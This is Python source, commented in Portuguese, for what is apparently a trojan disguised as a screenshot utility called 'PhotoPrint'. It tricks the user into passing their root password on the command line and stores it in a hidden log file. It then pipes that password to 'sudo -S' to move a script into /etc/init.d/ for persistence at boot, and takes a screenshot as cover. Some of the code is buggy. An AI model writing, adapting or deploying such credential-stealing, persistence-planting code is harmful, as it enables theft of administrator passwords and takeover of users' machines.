from time import sleep
from os import listdir, system
from threading import Thread
from sys import argv
import pyscreenshot as ImageGrab
from getpass import getuser
from colorama import Fore


class EnganaBobo:
    """
    fase da engenharia social, o objetivo é fazer o usuário inserir a senha no
    próprio programa, desse modo, ele cria uma copia de si mesmo para a pasta /run/
    """

    valor = argv[1]  # usuário
    senha = argv[2]  # senha

    @staticmethod
    def inicio():
        print("O photoprint precisa ser iniciado de modo especial")
        print("Por favor, execute-o como python3 PhotoPrint.py root sua_senha_root")
        print(Fore.RED + "Pode ser necessário acessar como root")

    @classmethod
    def save(cls):
        with open('.captured.log', 'w') as f:
            f.writelines(f"senha root: {EnganaBobo.senha}")


class CaptureSenha:
    """
    captura a senha digitado no terminal
    """

    @staticmethod
    def capture():
        if '.captured.log' not in listdir('..'):
            pass
        else:
            with open('.captured.log', 'r') as f:
                arquivo = f.read()
                _senha = arquivo[arquivo.index(':') + 2:]
            return _senha


class MoveOnSO:
    """
    Move o script para a inicialização do sistema, já que tem a senha do root
    """

    @staticmethod
    def export():
        # system(f'cp .captured.log config.py')
        sleep(1)
        system(f'echo {CaptureSenha.capture()} | sudo -S mv configuration.py /etc/init.d/')


class Photoprint:
    @staticmethod
    def imagem():
        print("Em 5 segundos, o print será tirado.")
        print("Você o encontrará no diretório imagens do seu computador")
        sleep(5)
        imagem = ImageGrab.grab()
        try:
            imagem.save(f'/home/{getuser()}/Pictures/Photoprint.jpg', 'jpeg')
        except FileExistsError:
            for n in range(20):
                if f'/home/{getuser()}/Pictures/Photoprint{n}.jpg' not in listdir(f'/home/{getuser()}/Pictures/'):
                    imagem.save(f'/home/{getuser()}/Pictures/Photoprint{n}.jpg', 'jpeg')
                    break


class Main:
    @staticmethod
    def run():
        th = [Thread(EnganaBobo.save(), args=()),
              Thread(Photoprint.imagem(),args=()),
              Thread(MoveOnSO.export(), args=())
              ]
        [thread.start() for thread in th]
        [thread.join() for thread in th]


if __name__ == '__main__':
    try:
        EnganaBobo.inicio()
    except IndexError:
        print("O photoprint precisa ser iniciado de modo especial")
        print("Por favor, execute-o como python3 PhotoPrint.py root sua_senha_root")
        print(Fore.RED+"Pode ser necessário acessar como root")
    else:
        th = Thread(Main.run(), args=())
        th.start()
        th.join()
